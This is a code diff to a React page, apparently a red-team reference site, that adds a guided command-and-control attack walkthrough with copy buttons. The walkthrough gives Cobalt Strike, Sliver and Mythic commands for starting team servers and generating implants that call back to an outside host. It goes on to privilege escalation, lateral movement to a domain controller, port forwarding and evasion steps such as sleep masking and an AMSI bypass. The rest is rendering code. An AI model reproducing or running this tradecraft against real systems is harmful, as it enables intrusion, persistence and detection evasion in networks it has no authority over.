@@ -19,6 +19,69 @@ const C2Frameworks = () => {
 
   const sections = [
     {
+      id: 'walkthrough',
+      title: 'Guided C2 Attack Chain Walkthrough',
+      content: [
+        {
+          type: 'markdown',
+          value: 'Follow this step-by-step chain for a typical C2 operation. Expand each step for details and commands.'
+        },
+        {
+          type: 'step',
+          title: '1. Team Server/Listener Setup',
+          description: 'Start your C2 team server or listener.',
+          commands: [
+            { value: './teamserver <IP> <PASSWORD>', description: 'Start Cobalt Strike team server' },
+            { value: 'sliver-server', description: 'Start Sliver server' },
+            { value: './start_mythic.sh', description: 'Start Mythic server' }
+          ]
+        },
+        {
+          type: 'step',
+          title: '2. Payload/Implant Generation',
+          description: 'Generate a payload or implant for your target OS.',
+          commands: [
+            { value: 'generate --mtls 10.0.0.1 --os windows --arch amd64 --save /tmp/ --format exe', description: 'Sliver Windows implant' },
+            { value: './apollo/mythic-cli payload create apollo -t windows -p "{\"callback_host\":\"10.0.0.1\",\"callback_port\":80}"', description: 'Mythic Apollo agent' }
+          ]
+        },
+        {
+          type: 'step',
+          title: '3. Initial Access',
+          description: 'Deliver the payload and establish a session.',
+          commands: [
+            { value: 'shell whoami /all', description: 'Verify access (Cobalt/Sliver/Mythic)' },
+            { value: 'ls /tmp', description: 'List files (Sliver)' }
+          ]
+        },
+        {
+          type: 'step',
+          title: '4. Privilege Escalation & Lateral Movement',
+          description: 'Escalate privileges and move laterally in the network.',
+          commands: [
+            { value: 'elevate svc-exe smb', description: 'Privilege escalation (Cobalt)' },
+            { value: 'getsystem', description: 'Privilege escalation (Sliver)' },
+            { value: 'psexec dc01 smb', description: 'Lateral movement (Cobalt)' },
+            { value: 'portfwd add -b 127.0.0.1:3389 -r 10.0.0.10:3389', description: 'Port forwarding (Sliver)' }
+          ]
+        },
+        {
+          type: 'step',
+          title: '5. OPSEC & Evasion',
+          description: 'Apply OPSEC techniques to evade detection.',
+          commands: [
+            { value: 'sleep_mask true', description: 'Sleep masking (Cobalt)' },
+            { value: 'set sleeptime 60 --jitter 20', description: 'Sleep/jitter (Sliver)' },
+            { value: 'amsi bypass', description: 'AMSI bypass (Sliver)' }
+          ]
+        },
+        {
+          type: 'markdown',
+          value: '**Tip:** After each step, verify your session and document your actions!'
+        }
+      ]
+    },
+    {
       id: 'cobalt',
       title: 'Cobalt Strike',
       content: [
@@ -243,36 +306,67 @@ http-get {
             >
               {expandedSection === section.id && (
                 <div className="content-inner">
-                  {section.content.map((item, index) => (
-                    <div key={index} className="content-item">
-                      {item.type === 'command' ? (
-                        <div className="command-item">
-                          <div className="command-header">
-                            <code>{item.value}</code>
+                  {section.content.map((item, index) => {
+                    if (item.type === 'step') {
+                      return (
+                        <div key={index} className="content-item walkthrough-step">
+                          <div className="step-header">
+                            <strong>{item.title}</strong>
+                          </div>
+                          <div className="step-description">{item.description}</div>
+                          <div className="step-commands">
+                            {item.commands.map((cmd, i) => (
+                              <div key={i} className="command-item">
+                                <div className="command-header">
+                                  <code>{cmd.value}</code>
+                                  <button
+                                    onClick={() => handleCopy(cmd.value)}
+                                    className="copy-button small"
+                                  >
+                                    Copy
+                                  </button>
+                                </div>
+                                <p className="command-description">{cmd.description}</p>
+                              </div>
+                            ))}
+                          </div>
+                        </div>
+                      );
+                    } else if (item.type === 'command') {
+                      return (
+                        <div key={index} className="content-item">
+                          <div className="command-item">
+                            <div className="command-header">
+                              <code>{item.value}</code>
+                              <button
+                                onClick={() => handleCopy(item.value)}
+                                className="copy-button small"
+                              >
+                                Copy
+                              </button>
+                            </div>
+                            <p className="command-description">{item.description}</p>
+                          </div>
+                        </div>
+                      );
+                    } else {
+                      return (
+                        <div key={index} className="content-item">
+                          <div className="markdown-content">
+                            <ReactMarkdown>
+                              {item.value}
+                            </ReactMarkdown>
                             <button
-                              onClick={() => handleCopy(item.value)}
-                              className="copy-button small"
+                              onClick={() => handleCopy(item.value.replace(/```[a-z]*\n/, '').replace(/\n```/, ''))}
+                              className="copy-button"
                             >
-                              Copy
+                              Copy All
                             </button>
                           </div>
-                          <p className="command-description">{item.description}</p>
                         </div>
-                      ) : (
-                        <div className="markdown-content">
-                          <ReactMarkdown>
-                            {item.value}
-                          </ReactMarkdown>
-                          <button
-                            onClick={() => handleCopy(item.value.replace(/```[a-z]*\n/, '').replace(/\n```/, ''))}
-                            className="copy-button"
-                          >
-                            Copy All
-                          </button>
-                        </div>
-                      )}
-                    </div>
-                  ))}
+                      );
+                    }
+                  })}
                 </div>
               )}
             </motion.div>
